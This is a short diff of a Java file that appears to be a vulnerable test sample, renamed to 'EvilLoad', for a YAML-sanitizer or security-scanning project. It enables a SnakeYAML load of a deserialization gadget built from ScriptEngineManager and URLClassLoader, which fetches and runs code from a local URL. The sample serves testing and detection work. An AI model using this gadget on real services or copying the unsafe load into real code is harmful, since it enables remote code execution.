@@ -1,4 +1,4 @@
-package sec.xtrfr.santinizer;
+package sec.xtrfr.negative;
 
 import org.yaml.snakeyaml.Yaml;
 import org.yaml.snakeyaml.constructor.Constructor;
@@ -8,12 +8,12 @@ import java.io.ByteArrayInputStream;
 import java.io.InputStream;
 import java.util.Map;
 
-public class NewLoad {
+public class EvilLoad {
 
     String vector = "some_var: !!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ " +
             "  !!java.net.URL [\"http://localhost:8000/abcdf.html\"]" +
             "     ]] ]";
     InputStream is = new ByteArrayInputStream(vector.getBytes());
     Yaml yaml = new Yaml(new Constructor(Test1.class));
-//    Map<String, Object> obj = yaml.load(is);
+    Map<String, Object> obj = yaml.load(is);
 }
